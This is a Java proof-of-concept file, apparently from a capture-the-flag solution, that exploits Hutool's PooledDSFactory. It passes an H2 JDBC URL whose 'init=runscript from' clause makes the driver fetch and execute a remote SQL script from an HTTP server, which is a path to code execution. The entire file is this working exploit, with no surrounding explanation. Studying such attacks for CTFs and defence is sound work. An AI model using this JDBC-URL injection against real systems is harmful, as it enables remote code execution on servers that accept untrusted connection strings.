package com.aliyunctf.agent.solution;

import cn.hutool.db.ds.pooled.PooledDSFactory;
import cn.hutool.setting.Setting;

public class PooledDSFactoryPoc {
    public static void main(String[] args) {
        String url = "jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'";
        Setting setting = new Setting();
        setting.set("url",url);
        setting.put("initialSize", "1");  // initialSize 为 1
        PooledDSFactory pooledDSFactory = new PooledDSFactory(setting);
        pooledDSFactory.getDataSource();
    }
}
